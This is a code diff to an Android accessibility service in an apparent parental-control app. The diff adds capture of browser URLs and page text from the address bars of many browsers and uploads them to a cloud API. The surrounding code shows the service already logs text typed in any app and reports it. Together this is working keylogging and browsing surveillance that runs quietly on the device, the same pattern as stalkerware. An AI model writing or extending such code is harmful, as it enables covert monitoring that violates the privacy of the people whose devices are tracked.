@@ -13,6 +13,8 @@ class TrackerAccessibilityService : AccessibilityService() {
 
     private var lastPackageName: String? = null
     private var lastEventTime: Long = 0
+    private var lastWebUrl: String? = null
+    private var lastWebUrlTime: Long = 0
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: return
@@ -53,6 +55,34 @@ class TrackerAccessibilityService : AccessibilityService() {
                     val appName = getAppName(packageName)
                     sendAppSwitchReport(packageName, appName, className)
                 }
+                if (isBrowserPackage(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    val eventText = event.text?.joinToString(" ") ?: ""
+                    val url = extractUrlFromBrowserWindow()
+                    val resolvedUrl = url ?: extractUrl(eventText)
+                    if (resolvedUrl != null && resolvedUrl != lastWebUrl && now - lastWebUrlTime > 3000) {
+                        lastWebUrl = resolvedUrl
+                        lastWebUrlTime = now
+                        sendWebHistoryWithTitle(packageName, resolvedUrl, eventText.take(200))
+                    } else if (eventText.isNotBlank() && eventText.length > 3 && now - lastWebUrlTime > 10000) {
+                        lastWebUrlTime = now
+                        sendWebHistoryWithTitle(packageName, "browsing:${packageName}", eventText.take(200))
+                    }
+                }
+            }
+
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                if (isBrowserPackage(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    val source = event.source
+                    if (source != null) {
+                        val url = findUrlInNode(source)
+                        source.recycle()
+                        if (url != null && url != lastWebUrl && now - lastWebUrlTime > 3000) {
+                            lastWebUrl = url
+                            lastWebUrlTime = now
+                            sendWebHistoryWithTitle(packageName, url, "")
+                        }
+                    }
+                }
             }
 
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
@@ -62,6 +92,19 @@ class TrackerAccessibilityService : AccessibilityService() {
                         val text = event.text?.joinToString(" ")
                         val pkg = event.packageName?.toString() ?: ""
                         if (text != null && text.isNotBlank() && text.length > 3) {
+                            if (isBrowserPackage(pkg)) {
+                                val url = extractUrl(text)
+                                if (url != null) {
+                                    val now = System.currentTimeMillis()
+                                    if (url != lastWebUrl && now - lastWebUrlTime > 3000) {
+                                        lastWebUrl = url
+                                        lastWebUrlTime = now
+                                        sendWebHistory(pkg, url)
+                                    }
+                                    source.recycle()
+                                    return
+                                }
+                            }
                             sendKeyLog(pkg, text)
                         }
                         source.recycle()
@@ -162,6 +205,159 @@ class TrackerAccessibilityService : AccessibilityService() {
         }.start()
     }
 
+    private fun extractUrlFromBrowserWindow(): String? {
+        try {
+            val root = rootInActiveWindow
+            if (root == null) return null
+            val url = findUrlInNode(root)
+            root.recycle()
+            return url
+        } catch (e: Exception) {
+            return null
+        }
+    }
+
+    private fun extractTitleFromBrowserWindow(): String {
+        try {
+            val root = rootInActiveWindow ?: return ""
+            val title = findTitleInNode(root)
+            root.recycle()
+            return title
+        } catch (e: Exception) {
+            return ""
+        }
+    }
+
+    private val KNOWN_URL_BAR_IDS = setOf(
+        "com.android.chrome:id/url_bar",
+        "com.android.chrome:id/omnibox_results_container",
+        "com.android.chrome:id/omnibox",
+        "com.android.chrome:id/search_box",
+        "org.mozilla.firefox:id/mozac_browser_awesomebar",
+        "org.mozilla.firefox:id/url_bar",
+        "com.opera.browser:id/url_bar",
+        "com.brave.browser:id/url_bar",
+        "com.sec.android.app.sbrowser:id/url_bar",
+        "com.vivaldi.browser:id/url_bar",
+        "com.microsoft.emmx:id/url_bar",
+        "com.microsoft.emmx:id/omnibox"
+    )
+
+    private fun findUrlInNode(node: AccessibilityNodeInfo): String? {
+        val viewId = node.viewIdResourceName ?: ""
+        if (viewId in KNOWN_URL_BAR_IDS) {
+            val text = node.text?.toString() ?: ""
+            if (text.isNotBlank()) {
+                val url = extractUrl(text)
+                if (url != null) return url
+                if (text.contains(".") && !text.contains(" ") && text.length in 4..200) return "https://$text"
+            }
+        }
+        val text = node.text?.toString() ?: ""
+        if (text.isNotBlank() && text.length > 3) {
+            val url = extractUrl(text)
+            if (url != null) return url
+        }
+        val desc = node.contentDescription?.toString() ?: ""
+        if (desc.isNotBlank() && desc.length > 5) {
+            val url = extractUrl(desc)
+            if (url != null) return url
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val result = findUrlInNode(child)
+            child.recycle()
+            if (result != null) return result
+        }
+        return null
+    }
+
+    private fun findTitleInNode(node: AccessibilityNodeInfo): String {
+        val viewId = node.viewIdResourceName ?: ""
+        if (viewId.contains("title", true) || viewId.contains("page_title", true)) {
+            val text = node.text?.toString() ?: ""
+            if (text.isNotBlank() && text.length > 2) return text
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val result = findTitleInNode(child)
+            child.recycle()
+            if (result.isNotBlank()) return result
+        }
+        return ""
+    }
+
+    private fun sendWebHistoryWithTitle(packageName: String, url: String, title: String) {
+        Thread {
+            try {
+                val payload = org.json.JSONObject().apply {
+                    put("device_id", com.parentalcontrol.app.api.CloudConfig.deviceId)
+                    put("webhistory", org.json.JSONArray().apply {
+                        put(org.json.JSONObject().apply {
+                            put("url", url)
+                            put("title", title)
+                            put("browser", getAppName(packageName))
+                            put("visit_count", 1)
+                            put("timestamp", System.currentTimeMillis())
+                        })
+                    })
+                }
+                com.parentalcontrol.app.api.ApiClient.sendBulkReport(payload.toString())
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }.start()
+    }
+
+    private fun sendWebHistory(packageName: String, url: String) {
+        Thread {
+            try {
+                val payload = org.json.JSONObject().apply {
+                    put("device_id", com.parentalcontrol.app.api.CloudConfig.deviceId)
+                    put("webhistory", org.json.JSONArray().apply {
+                        put(org.json.JSONObject().apply {
+                            put("url", url)
+                            put("title", "")
+                            put("browser", getAppName(packageName))
+                            put("visit_count", 1)
+                            put("timestamp", System.currentTimeMillis())
+                        })
+                    })
+                }
+                com.parentalcontrol.app.api.ApiClient.sendBulkReport(payload.toString())
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }.start()
+    }
+
+    private fun isBrowserPackage(packageName: String): Boolean {
+        return BROWSER_PACKAGES.any { packageName == it || packageName.startsWith(it) }
+    }
+
+    private fun writeDebugLog(msg: String) {
+        try {
+            val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
+            java.io.File(filesDir, "debug.log").appendText("$ts A11y: $msg\n")
+        } catch (_: Exception) {}
+    }
+
+    private fun extractUrl(text: String): String? {
+        val trimmed = text.trim()
+        if (trimmed.isEmpty() || trimmed.length > 2048) return null
+        if (trimmed.startsWith("http://", true) || trimmed.startsWith("https://", true)) {
+            return trimmed.split(" ")[0]
+        }
+        if (trimmed.startsWith("www.")) {
+            return "https://$trimmed".split(" ")[0]
+        }
+        val urlPattern = Regex("^(https?://)?[a-zA-Z0-9][-a-zA-Z0-9]*\\.[a-zA-Z]{2,}(/.*)?$", RegexOption.IGNORE_CASE)
+        if (urlPattern.matches(trimmed) && trimmed.contains(".")) {
+            return if (trimmed.startsWith("http", true)) trimmed else "https://$trimmed"
+        }
+        return null
+    }
+
     private fun getAppName(packageName: String): String {
         return try {
             val pm = packageManager
@@ -173,6 +369,22 @@ class TrackerAccessibilityService : AccessibilityService() {
 
     companion object {
         private const val TAG = "TrackerAccessibility"
+
+        private val BROWSER_PACKAGES = setOf(
+            "com.android.chrome",
+            "com.android.browser",
+            "org.mozilla.firefox",
+            "com.opera.browser",
+            "com.opera.mini.native",
+            "com.brave.browser",
+            "com.mi.globalbrowser",
+            "com.vivaldi.browser",
+            "com.sec.android.app.sbrowser",
+            "com.android.webview",
+            "com.microsoft.emmx",
+            "com.google.android.googlequicksearchbox",
+            "com.vivo.browser"
+        )
 
         @Volatile
         var instance: TrackerAccessibilityService? = null
